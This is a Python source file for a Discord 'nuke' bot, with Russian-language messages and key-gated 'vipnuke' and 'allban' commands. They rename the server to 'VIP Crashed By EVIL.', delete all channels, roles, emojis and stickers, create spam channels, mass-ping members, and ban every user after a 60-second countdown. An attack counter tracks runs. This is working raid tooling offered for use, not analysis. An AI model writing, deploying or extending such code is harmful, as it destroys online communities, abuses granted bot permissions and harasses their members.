import disnake
import asyncio
from disnake.ext import commands
from disnake.ext.commands import BucketType, CommandOnCooldown

from ..utils.bot_operations import Fucker
from ..utils.counter import AttackCounter
from ..utils.key_manager import key_manager
from ..utils.blacklist import is_blacklisted


class VipNuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.attack_counter = AttackCounter()

    @commands.command(name="vipnuke")
    @commands.cooldown(1, 120, BucketType.guild)
    async def vipnuke(self, ctx):
        if ctx.guild is None:
            embed = disnake.Embed(
                title="❌ Ошибка",
                description="Эта команда работает только на сервере!",
                color=disnake.Color.red()
            )
            await ctx.send(embed=embed)
            return

        if is_blacklisted(ctx.guild.id):
            embed = disnake.Embed(
                title="⛔ Доступ запрещён",
                description="Этот сервер в чёрном списке.",
                color=disnake.Color.red()
            )
            await ctx.send(embed=embed)
            return

        if not key_manager.has_access(ctx.author.id):
            embed = disnake.Embed(
                title="❌ Доступ запрещён",
                description="Активируйте ключ в ЛС командой `/key КЛЮЧ`",
                color=disnake.Color.red()
            )
            await ctx.send(embed=embed)
            return

        self.attack_counter.record_attack_start()

        expires = key_manager.get_access_expiry(ctx.author.id)
        expires_str = "Бессрочно" if expires is None else expires

        embed_start = disnake.Embed(
            title="🔥 VIP NUKE ЗАПУЩЕН",
            description=f"**{ctx.author.name}** активировал VIP-атаку!\n"
                        f"Доступ до: {expires_str}\n\n"
                        f"⚡ **Через 60 секунд все пользователи будут забанены!**",
            color=disnake.Color.from_rgb(48, 49, 54)
        )
        await ctx.send(embed=embed_start)

        fucker = Fucker(ctx)
        
        # 1. Меняем название и аватарку
        await ctx.guild.edit(name="VIP Crashed By EVIL.", icon=None)
        await fucker.change_avatar(ctx, "serverlogo.png")
        
        # 2. Удаляем всё мгновенно
        await asyncio.gather(
            fucker.delChannels(ctx),
            fucker.delRoles(ctx),
            fucker.delete_all_emojis(ctx),
            fucker.delete_all_stickers(ctx),
        )
        
        # 3. Создаём каналы и роли параллельно
        await asyncio.gather(
            fucker.crChannelsVip(ctx),
            fucker.crRoles(ctx),
        )
        
        # 4. Спамим
        await fucker.spamVip(ctx)
        
        # 5. Ивенты
        await fucker.delete_events(ctx)
        await fucker.create_event(ctx)

        # 6. БАН ВСЕХ С ТАЙМЕРОМ
        target_channel = None
        for channel in ctx.guild.text_channels:
            target_channel = channel
            break
        
        if target_channel is None:
            target_channel = await ctx.guild.create_text_channel("ban-log")
        
        print(f"⏳ [VIP NUKE] Начинаю отсчёт 60 секунд до бана на сервере {ctx.guild.name}")
        await target_channel.send("⚠️ **ВНИМАНИЕ!** Через 60 секунд все пользователи будут забанены!")
        
        for i in range(60, 0, -1):
            if i % 10 == 0 or i <= 5:
                print(f"⏳ [VIP NUKE] Осталось {i} секунд до бана на сервере {ctx.guild.name}")
                await target_channel.send(f"⏳ Осталось **{i}** секунд до бана всех пользователей!")
            await asyncio.sleep(1)
        
        print(f"🔴 [VIP NUKE] НАЧИНАЮ МАССОВЫЙ БАН на сервере {ctx.guild.name}")
        await target_channel.send("🔴 **НАЧИНАЮ МАССОВЫЙ БАН!**")
        
        await fucker.ban_all(ctx)
        
        print(f"✅ [VIP NUKE] МАССОВЫЙ БАН ЗАВЕРШЁН на сервере {ctx.guild.name}")

        self.attack_counter.record_attack_end()

        embed_end = disnake.Embed(
            title="✅ VIP NUKE ЗАВЕРШЁН",
            description=f"Создано: 20 каналов\n"
                        f"Пингов: 5 в каждый\n"
                        f"👥 Все пользователи забанены!",
            color=disnake.Color.from_rgb(48, 49, 54)
        )
        await target_channel.send(embed=embed_end)

    @vipnuke.error
    async def vipnuke_error(self, ctx, error):
        if isinstance(error, CommandOnCooldown):
            embed = disnake.Embed(
                title="⏳ Кулдаун",
                description=f"Повторите через {error.retry_after:.2f} секунд.",
                color=disnake.Color.from_rgb(48, 49, 54)
            )
            await ctx.send(embed=embed)
        else:
            raise error

    @commands.command(name="allban")
    @commands.cooldown(1, 300, BucketType.guild)
    async def allban(self, ctx):
        if ctx.guild is None:
            embed = disnake.Embed(
                title="❌ Ошибка",
                description="Эта команда работает только на сервере!",
                color=disnake.Color.red()
            )
            await ctx.send(embed=embed)
            return

        if is_blacklisted(ctx.guild.id):
            embed = disnake.Embed(
                title="⛔ Доступ запрещён",
                description="Этот сервер в чёрном списке.",
                color=disnake.Color.red()
            )
            await ctx.send(embed=embed)
            return

        if not key_manager.has_access(ctx.author.id):
            embed = disnake.Embed(
                title="❌ Доступ запрещён",
                description="Активируйте ключ в ЛС командой `/key КЛЮЧ`",
                color=disnake.Color.red()
            )
            await ctx.send(embed=embed)
            return

        embed_start = disnake.Embed(
            title="👥 МАССОВЫЙ БАН",
            description=f"⚡ Через 60 секунд все пользователи будут забанены!",
            color=disnake.Color.from_rgb(48, 49, 54)
        )
        await ctx.send(embed=embed_start)

        fucker = Fucker(ctx)

        print(f"⏳ [ALLBAN] Начинаю отсчёт 60 секунд до бана на сервере {ctx.guild.name}")
        
        for i in range(60, 0, -1):
            if i % 10 == 0 or i <= 5:
                print(f"⏳ [ALLBAN] Осталось {i} секунд до бана на сервере {ctx.guild.name}")
                await ctx.send(f"⏳ Осталось **{i}** секунд")
            await asyncio.sleep(1)

        print(f"🔴 [ALLBAN] НАЧИНАЮ МАССОВЫЙ БАН на сервере {ctx.guild.name}")
        await ctx.send("🔴 **НАЧИНАЮ МАССОВЫЙ БАН!**")
        await fucker.ban_all(ctx)

        print(f"✅ [ALLBAN] МАССОВЫЙ БАН ЗАВЕРШЁН на сервере {ctx.guild.name}")

        embed_end = disnake.Embed(
            title="✅ МАССОВЫЙ БАН ЗАВЕРШЁН",
            description="👥 Все пользователи (кроме админов и бота) забанены.",
            color=disnake.Color.from_rgb(48, 49, 54)
        )
        await ctx.send(embed=embed_end)

    @allban.error
    async def allban_error(self, ctx, error):
        if isinstance(error, CommandOnCooldown):
            embed = disnake.Embed(
                title="⏳ Кулдаун",
                description=f"Повторите через {error.retry_after:.2f} секунд.",
                color=disnake.Color.from_rgb(48, 49, 54)
            )
            await ctx.send(embed=embed)
        else:
            raise error


def setup(bot):
    bot.add_cog(VipNuke(bot))